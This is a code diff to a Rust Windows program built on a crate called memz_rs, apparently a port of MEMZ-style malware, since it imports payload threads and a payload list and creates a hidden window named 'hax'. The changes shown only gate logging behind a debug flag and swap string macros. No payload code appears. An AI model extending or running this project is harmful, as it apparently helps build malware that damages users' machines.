@@ -1,3 +1,6 @@
+#[cfg(feature = "DEBUG_MODE")]
+use memz_rs::utils::log::*;
+
 use memz_rs::{
     convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper},
     data::{
@@ -10,7 +13,6 @@ use memz_rs::{
         function::{payload_thread, N_PAYLOADS, PAYLOADS},
     },
     s_v,
-    utils::log::{self, write_log, LogLocation, LogType},
     winapi_type::DWORD,
     wrap_windows_api::*,
     LMEM_ZEROINIT, MEM_ZEROINIT,
@@ -23,7 +25,7 @@ use std::{
 };
 use windows::{
     core::{PCSTR, PCWSTR},
-    w,
+    s, w,
     Win32::{
         Foundation::{
             GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND,
@@ -51,6 +53,7 @@ use windows::{
 };
 
 fn main() -> Result<(), WinError> {
+    #[cfg(feature = "DEBUG_MODE")]
     log::new_log();
     let (_scrw, _scrh) = (
         wrap_get_system_metrics(SM_CXSCREEN)?,
@@ -84,7 +87,7 @@ fn main() -> Result<(), WinError> {
             hCursor: HCURSOR(0),
             hbrBackground: HBRUSH(0),
             lpszMenuName: PCSTR::null(),
-            lpszClassName: *"hax".to_pcstr(),
+            lpszClassName: s!("hax"),
             hIconSm: HICON(0),
         };
 
@@ -93,7 +96,7 @@ fn main() -> Result<(), WinError> {
         let hwnd = unsafe {
             CreateWindowExA(
                 WINDOW_EX_STYLE(0),
-                *"hax".to_pcstr(),
+                s!("hax"),
                 PCSTR::null(),
                 WINDOW_STYLE(0),
                 0,
@@ -115,6 +118,7 @@ fn main() -> Result<(), WinError> {
         while wrap_get_message(&mut msg, hwnd, 0, 0)? {
             unsafe {
                 if !TranslateMessage(&msg).as_bool() {
+                    #[cfg(feature = "DEBUG_MODE")]
                     write_log(
                         LogType::ERROR,
                         LogLocation::LOG,
@@ -143,7 +147,7 @@ fn main() -> Result<(), WinError> {
             process::exit(0);
         }
 
-        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // LOGoc 8192 * 2
+        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // LocalAlloc 8192 * 2
         wrap_get_module_file_name(HMODULE::default(), &mut fn_buf)?;
 
         let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");
